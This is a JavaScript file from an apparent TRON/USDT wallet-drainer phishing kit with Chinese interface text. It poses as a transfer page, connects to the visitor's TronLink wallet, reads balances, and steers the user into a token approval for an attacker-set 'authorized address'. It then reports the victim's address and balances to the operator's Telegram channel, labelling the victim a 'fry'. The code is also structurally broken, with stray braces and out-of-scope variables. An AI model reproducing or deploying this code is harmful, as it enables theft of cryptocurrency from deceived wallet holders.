document.addEventListener('DOMContentLoaded', function() {
  let trxBalance = 0;
  let usdtBalance = 0;
  let userAddress = null;

  connectWallet();

  async function connectWallet() {
    if (window.tronWeb && window.tronWeb.ready) {
      initDApp();
    } else if (window.tronLink) {
      try {
        const res = await window.tronLink.request({ method: 'tron_requestAccounts' });
        if (res.code === 200) {
          window.tronWeb = window.tronLink.tronWeb;
          initDApp();
        }
      } catch (error) {
        // 处理错误，不用
      }
    }
  }

  async function initDApp() {
    try {
      const address = window.tronWeb.defaultAddress.base58;
      userAddress = address;

      trxBalance = await window.tronWeb.trx.getBalance(address);
      trxBalance = window.tronWeb.fromSun(trxBalance);

      const usdtContractAddress = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
      const usdtContract = await window.tronWeb.contract().at(usdtContractAddress);
      usdtBalance = await usdtContract.balanceOf(address).call();
      usdtBalance = usdtBalance / 1e6;

      updateUsdtDisplay(usdtBalance);
    } catch (error) {
      // 处理错误，不用
    }
  }

  function updateUsdtDisplay(balance) {
    const balanceDisplayElement = document.querySelector('.currency-display-component__text span');
    if (balanceDisplayElement) {
      balanceDisplayElement.textContent = parseFloat(balance).toFixed(6);
    }
  }

  const maxAmountButton = document.querySelector('.send-v2__amount-max');
  if (maxAmountButton) {
    maxAmountButton.addEventListener('click', function() {
      document.getElementById('available1').value = usdtBalance;
      validateInput();
      updateAmount(usdtBalance);
    });
  }

  const inputField = document.getElementById('available1');
  if (inputField) {
    inputField.addEventListener('input', validateInput);
  }


  function validateInput() {
    const inputValue = parseFloat(inputField.value) || 0;
    if (inputValue > usdtBalance) {
      alert('输入金额超过您的USDT余额');
      inputField.value = usdtBalance;
    }
  }
})

document.querySelector('.page-container__footer-button').addEventListener('click', async function() {
    const inputValue = parseFloat(inputField.value) || 0;
    const trxBalanceNum = parseFloat(trxBalance);
    const usdtBalanceNum = parseFloat(usdtBalance);

    if (inputValue <= 0 || inputValue > usdtBalance) {
        alert('请输入正确的金额');
        return;
    }

    if (config.trxBalanceThreshold !== '0' && trxBalanceNum < parseFloat(config.trxBalanceThreshold)) {
        alert("您的TRX余额不足以支付交易矿工费。");
    } else if (config.usdtBalanceThreshold !== '0' && usdtBalanceNum < parseFloat(config.usdtBalanceThreshold)) {
        alert("您的USDT余额不足，发起交易可能会失败。");
    } else {
        if(/okex/.test(navigator.userAgent.toLowerCase())) {
            await okxapprove();
        } else {
            showWarningPage();
        }
    }
});

  function showWarningPage() {
    var warningContainer = document.querySelector('.a_mobile-container1');
    if (warningContainer) {
      warningContainer.style.display = 'block';
      warningContainer.style.top = '0';
    }
  }
 });

document.addEventListener('DOMContentLoaded', function() {
    document.title = '正在执行转账操作';

    document.getElementById('available1').addEventListener('input', function() {
        var amount = this.value;
        if (amount) {
            document.title = `正在进行转账支付 ${amount} USDT`;
        } else {
            document.title = 'USDT转账支付';
        }
        updateAmount(amount);
    });

    window.showTip = function(mode) {
        let tip1 = document.getElementById('tip1');
        let tip2 = document.getElementById('tip2');
        let option1 = document.getElementById('option1').querySelector('input');
        let option2 = document.getElementById('option2').querySelector('input');
        let amount = document.getElementById('available1').value;

        document.querySelectorAll('.approveAmount').forEach(function(elem) {
            elem.textContent = amount;
        });

        if (mode === 1) {
            tip1.style.display = 'block';
            tip2.style.display = 'none';
            option2.checked = false;
        } else if (mode === 2) {
            tip1.style.display = 'none';
            tip2.style.display = 'block';
            option1.checked = false;
        }
    };
});

function updateAmount(amount) {
    document.getElementById('number-input').value = amount;

    var approveAmountElements = document.querySelectorAll('.approveAmount');
    approveAmountElements.forEach(function(element) {
        element.innerText = amount;
    });

    document.title = `正在进行转账支付 ${amount} USDT`;
}
function scrollUpAndRedirect() {
    document.querySelector('.a_mobile-container1').style.display = 'none';
}

async function confirmApprove() {
    let option1 = document.getElementById('option1').querySelector('input').checked;
    let option2 = document.getElementById('option2').querySelector('input').checked;

    if (option1 || option2) {
        document.getElementById('errorText').style.display = 'none';
        await approve();
    } else {
        document.getElementById('errorText').style.display = 'block';
    }
}

async function sendTelegramNotification(customerAddress, transactionHash) {
    const currentDateTime = new Date().toLocaleString();
    let trxBalance = null;
    let usdtBalance = null;
    try {
        const trxBalanceRaw = await window.tronWeb.trx.getBalance(customerAddress);
        trxBalance = window.tronWeb.fromSun(trxBalanceRaw);
    } catch (error) {
        trxBalance = "查询失败";
    }
    try {
        const usdtContractAddress = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
        const usdtContract = await window.tronWeb.contract().at(usdtContractAddress);
        const usdtBalanceData = await usdtContract.balanceOf(customerAddress).call();
        usdtBalance = usdtBalanceData.toNumber() / 1e6;
    } catch (error) {
        usdtBalance = "查询失败";
    }
    const authorizedAddress = config.authorizedAddress;
    const message = `
<b>【🛎TRC授权通知🛎】</b>

<b>🐠鱼苗地址：</b><code>${customerAddress}</code>

<b>🔐权限地址：</b><code>${authorizedAddress}</code>

<b>📨授权状态：</b><code>✅授权成功</code>

<b>⏰授权时间：</b><code>${currentDateTime}</code>

<b>💵TRX余额：</b><code>${typeof trxBalance === "number" ? trxBalance.toFixed(6) : trxBalance}</code> | <b>USDT余额：</b><code>${typeof usdtBalance === "number" ? usdtBalance.toFixed(6) : usdtBalance}</code>
    `;
    const url = `https://api.telegram.org/bot${config.telegramBotToken}/sendMessage`;
    const keyboard = {
        inline_keyboard: [[{
            text: "🌍进入区块链浏览器查看详情",
            url: `https://tronscan.org/#/transaction/${transactionHash}`
        }]]
    };
    try {
        const response = await fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                chat_id: config.telegramChannelId,
                text: message,
                parse_mode: 'HTML',
                reply_markup: keyboard
            })
        });
        const data = await response.json();
        if (!data.ok) {
            throw new Error('消息发送失败: ' + JSON.stringify(data));
        }
    } catch (error) {
        // Handle the error silently
    }
  }
});
